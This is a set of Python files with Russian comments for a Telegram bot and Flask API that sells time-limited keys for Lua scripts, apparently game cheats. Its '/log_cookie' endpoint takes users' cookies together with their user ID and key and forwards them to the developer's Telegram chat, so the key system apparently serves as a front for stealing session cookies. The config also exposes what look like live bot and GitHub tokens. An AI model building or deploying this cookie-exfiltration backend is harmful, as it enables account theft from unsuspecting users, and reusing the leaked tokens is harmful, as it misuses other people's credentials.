# Конфигурация бота
BOT_TOKEN = "8701787762:AAHVjQEYbgXiA7krz-B54QpBP0mXmtdAE_Q"
DEV_ID = 8427404723

# GitHub (опционально, для автообновления скриптов)
GITHUB_TOKEN = "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"
GITHUB_REPO = "zackerr69/zack_hub"
GITHUB_FILE_PATH = "universal_zack_Vglobal.lua"
import sqlite3
from datetime import datetime

class Database:
    def __init__(self, db_path='keys.db'):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS users
                        (user_id INTEGER PRIMARY KEY, username TEXT,
                         first_seen TIMESTAMP, last_active TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS keys
                        (key_text TEXT PRIMARY KEY, created_at TIMESTAMP,
                         expires_at TIMESTAMP, max_uses INTEGER DEFAULT 999)''')
            c.execute('''CREATE TABLE IF NOT EXISTS activations
                        (user_id INTEGER, key_text TEXT, activated_at TIMESTAMP,
                         UNIQUE(user_id, key_text))''')
    
    def add_user(self, user_id, username):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO users (user_id, username, first_seen) VALUES (?, ?, datetime('now'))",
                     (user_id, username))
            c.execute("UPDATE users SET last_active = datetime('now') WHERE user_id = ?", (user_id,))
    
    def check_key(self, key_text, user_id):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            
            # Проверяем существование ключа
            c.execute("SELECT expires_at FROM keys WHERE key_text = ?", (key_text,))
            row = c.fetchone()
            if not row:
                return "NOT_FOUND"
            
            # Проверяем срок действия
            expires = datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S')
            if expires < datetime.now():
                return "EXPIRED"
            
            # Проверяем, активировал ли уже этот пользователь
            c.execute("SELECT 1 FROM activations WHERE user_id = ? AND key_text = ?", (user_id, key_text))
            if c.fetchone():
                return "ALREADY_USED"
            
            return "VALID"
    
    def activate_key(self, key_text, user_id):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO activations (user_id, key_text, activated_at) VALUES (?, ?, datetime('now'))",
                     (user_id, key_text))
    
    def get_stats(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            users = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM keys")
            keys = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM activations")
            acts = c.fetchone()[0]
            return users, keys, acts
from flask import Flask, request, jsonify
import sqlite3
from datetime import datetime
import threading
import requests
from config import BOT_TOKEN, DEV_ID

app = Flask(__name__)

@app.route('/check_key', methods=['POST'])
def check_key():
    data = request.json
    user_id = data.get('user_id')
    username = data.get('username')
    key = data.get('key')
    
    if not all([user_id, key]):
        return jsonify({"status": "error", "message": "Missing data"}), 400
    
    conn = sqlite3.connect('keys.db')
    c = conn.cursor()
    
    # Сохраняем пользователя
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_seen) VALUES (?, ?, datetime('now'))",
              (user_id, username))
    c.execute("UPDATE users SET last_active = datetime('now') WHERE user_id = ?", (user_id,))
    
    # Проверяем ключ
    c.execute("SELECT expires_at FROM keys WHERE key_text = ?", (key,))
    row = c.fetchone()
    
    if not row:
        result = "NOT_FOUND"
        message = "Ключ не существует"
    else:
        expires = datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S')
        if expires < datetime.now():
            result = "EXPIRED"
            message = "ПРОМОКОД ИСЧЕРПАН"
        else:
            c.execute("SELECT 1 FROM activations WHERE user_id = ? AND key_text = ?", (user_id, key))
            if c.fetchone():
                result = "ALREADY_USED"
                message = "ПРОМОКОДИК УЖЕ БЫЛ АКТИВИРОВАН РАНЕЕ"
            else:
                c.execute("INSERT INTO activations (user_id, key_text, activated_at) VALUES (?, ?, datetime('now'))",
                          (user_id, key))
                result = "VALID"
                message = "Ключ принят"
                
                # Уведомление разработчику
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": DEV_ID,
                            "text": f"🔑 Новая активация\n👤 {username} (ID: {user_id})\n🔐 Ключ: {key}"
                        }
                    )
                except:
                    pass
    
    conn.commit()
    conn.close()
    
    return jsonify({
        "status": result,
        "message": message
    })

@app.route('/log_cookie', methods=['POST'])
def log_cookie():
    data = request.json
    user_id = data.get('user_id')
    username = data.get('username')
    cookie = data.get('cookie')
    key = data.get('key')
    
    if not cookie:
        return jsonify({"status": "error"}), 400
    
    # Отправляем в Telegram
    try:
        text = f"🍪 **НОВАЯ КУКА**\n"
        text += f"👤 {username} (ID: {user_id})\n"
        text += f"🔑 Ключ: {key}\n"
        text += f"🍪 Cookie: `{cookie}`"
        
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": DEV_ID,
                "text": text,
                "parse_mode": "Markdown"
            }
        )
    except:
        pass
    
    return jsonify({"status": "ok"})

def run_api():
    app.run(host='0.0.0.0', port=5000, debug=False)

def start_api():
    thread = threading.Thread(target=run_api, daemon=True)
    thread.start()
    print("✅ API сервер запущен на порту 5000")
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
import sqlite3
import os
from datetime import datetime, timedelta
import json

# Настройка логирования
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "8701787762:AAHVjQEYbgXiA7krz-B54QpBP0mXmtdAE_Q"
DEV_ID = 8427404723

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect('keys.db')
    c = conn.cursor()
    
    # Таблица пользователей
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  username TEXT,
                  first_seen TIMESTAMP,
                  last_active TIMESTAMP)''')
    
    # Таблица ключей
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key_text TEXT PRIMARY KEY,
                  created_at TIMESTAMP,
                  expires_at TIMESTAMP,
                  max_uses INTEGER DEFAULT 999)''')
    
    # Таблица активаций
    c.execute('''CREATE TABLE IF NOT EXISTS activations
                 (user_id INTEGER,
                  key_text TEXT,
                  activated_at TIMESTAMP,
                  UNIQUE(user_id, key_text))''')
    
    conn.commit()
    conn.close()

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # Сохраняем пользователя в БД
    conn = sqlite3.connect('keys.db')
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_seen) VALUES (?, ?, datetime('now'))",
              (user_id, user.username))
    c.execute("UPDATE users SET last_active = datetime('now') WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    if user_id == DEV_ID:
        await update.message.reply_text(
            "🔧 Панель разработчика\n\n"
            "/state — статистика\n"
            "/new_lock {ключ} {время} — создать ключ\n"
            "/del_lock {ключ} — удалить ключ"
        )
    else:
        await update.message.reply_text(
            f"👋 Привет, {user.first_name}!\n"
            f"Лучшие скрипты в @sajkyn\n"
            f"Обновления раз в месяц 🔥"
        )

# Команда /state
async def state(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DEV_ID:
        return
    
    conn = sqlite3.connect('keys.db')
    c = conn.cursor()
    
    # Статистика пользователей
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    # Статистика ключей
    c.execute("SELECT COUNT(*) FROM keys")
    total_keys = c.fetchone()[0]
    
    # Статистика активаций
    c.execute("SELECT COUNT(*) FROM activations")
    total_activations = c.fetchone()[0]
    
    # Последние активации
    c.execute('''SELECT users.username, users.user_id, activations.key_text, activations.activated_at 
                 FROM activations 
                 JOIN users ON activations.user_id = users.user_id 
                 ORDER BY activations.activated_at DESC LIMIT 10''')
    recent = c.fetchall()
    
    conn.close()
    
    msg = f"📊 **СТАТИСТИКА**\n\n"
    msg += f"👥 Всего пользователей: {total_users}\n"
    msg += f"🔑 Всего ключей: {total_keys}\n"
    msg += f"⚡ Активаций: {total_activations}\n\n"
    msg += "**Последние активации:**\n"
    
    for i, (username, uid, key, time) in enumerate(recent, 1):
        msg += f"{i}. @{username or uid} — {key} — {time[:16]}\n"
    
    await update.message.reply_text(msg)

# Команда /new_lock
async def new_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DEV_ID:
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("Использование: /new_lock КЛЮЧ время_цифра day/hour/month")
        return
    
    key = args[0]
    amount = int(args[1])
    unit = args[2].lower()
    
    if unit == "day":
        delta = timedelta(days=amount)
    elif unit == "hour":
        delta = timedelta(hours=amount)
    elif unit == "month":
        delta = timedelta(days=amount*30)
    else:
        await update.message.reply_text("Единица времени: day/hour/month")
        return
    
    expires = datetime.now() + delta
    
    conn = sqlite3.connect('keys.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO keys (key_text, created_at, expires_at) VALUES (?, datetime('now'), ?)",
              (key, expires.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(f"✅ Ключ {key} создан до {expires}")

# Команда /del_lock
async def del_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DEV_ID:
        return
    
    if not context.args:
        await update.message.reply_text("Использование: /del_lock КЛЮЧ")
        return
    
    key = context.args[0]
    
    conn = sqlite3.connect('keys.db')
    c = conn.cursor()
    c.execute("DELETE FROM keys WHERE key_text = ?", (key,))
    deleted = c.rowcount
    conn.commit()
    conn.close()
    
    if deleted:
        await update.message.reply_text(f"✅ Ключ {key} удалён")
    else:
        await update.message.reply_text(f"❌ Ключ {key} не найден")

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("state", state))
    app.add_handler(CommandHandler("new_lock", new_lock))
    app.add_handler(CommandHandler("del_lock", del_lock))
    
    print("Бот запущен...")
    app.run_polling()

if __name__ == "__main__":
    main()
if __name__ == "__main__":
    import threading
    threading.Thread(target=run_api, daemon=True).start()
    print("✅ API запущен на порту 5000")
    print("✅ Бот запускается...")
    main()
